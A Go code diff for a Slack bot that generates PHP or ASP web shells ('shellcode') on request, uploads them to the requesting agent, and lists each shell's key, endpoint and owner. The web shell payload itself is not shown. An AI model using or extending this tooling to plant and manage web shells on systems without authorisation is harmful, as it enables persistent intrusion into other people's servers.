@@ -17,6 +17,17 @@ func (s *botService) cmdGenerateShellcode() {
 		},
 		Handler: func(request slacker.Request, response slacker.ResponseWriter) {
 			agent := request.Event().User
+			shellType := request.Param("type")
+			if govalidator.IsNull(shellType) {
+				s.sendError(errors.New("generate shellcode, format `generate <type>`"), request, response, true)
+				return
+			}
+
+			if !(shellType == "php" || shellType == "asp") {
+				s.sendError(errors.New("invalid shellcode type, valid type `php` and `asp`"), request, response, true)
+				return
+			}
+
 			userInfo, err := s.slack.GetUserInfo(agent)
 			if err != nil {
 				s.sendError(errors.New("get user information"), request, response, true)
@@ -29,7 +40,7 @@ func (s *botService) cmdGenerateShellcode() {
 				return
 			}
 
-			shellcode, err := s.helper.WriteShellcode(randomKey)
+			shellcode, err := s.helper.WriteShellcode(randomKey, shellType)
 			if err != nil {
 				s.sendError(errors.New("generate shell"), request, response, true)
 				return
@@ -37,10 +48,10 @@ func (s *botService) cmdGenerateShellcode() {
 
 			s.mentionAgent(request, response)
 			client := response.Client()
-			//TODO: make shellcode extension option
 			file, err := client.UploadFile(slack.FileUploadParameters{
-				Title:    "Shell Name: " + randomKey,
-				Filetype: "php",
+				Title:    "Name: " + randomKey + " Type: " + shellType,
+				Filetype: shellType,
+				Filename: randomKey + "." + shellType,
 				Content:  string(shellcode),
 				Channels: []string{agent},
 			})
@@ -49,7 +60,7 @@ func (s *botService) cmdGenerateShellcode() {
 				return
 			}
 
-			err = s.service.CreateShellcode(file.ID, randomKey, userInfo.ID, userInfo.RealName)
+			err = s.service.CreateShellcode(file.ID, shellType, randomKey, userInfo.ID, userInfo.RealName)
 			if err != nil {
 				s.sendError(err, request, response, true)
 				return
@@ -57,7 +68,7 @@ func (s *botService) cmdGenerateShellcode() {
 		},
 	}
 
-	s.slack.Command("generate", cmd)
+	s.slack.Command("generate <type>", cmd)
 }
 
 func (s *botService) cmdGetShellcodes() {
@@ -110,7 +121,7 @@ func (s *botService) cmdGetShellcodes() {
 					agentShellcodeCount++
 				}
 
-				shellcodeInfo := "```" + "File ID: " + shellcode.FileID + "\nKey: " + shellcode.ShellKey + "\nEndpoint: " + shellcode.Endpoint + "\nOwner: @" + shellcode.OwnerRealName + "```"
+				shellcodeInfo := "```" + "File ID: " + shellcode.FileID + "\nKey: " + shellcode.ShellKey + "\nEndpoint: " + shellcode.Endpoint + "\nType: " + shellcode.Type + "\nOwner: @" + shellcode.OwnerRealName + "```"
 				s.sendReply(shellcodeInfo, request, response, false)
 			}
 
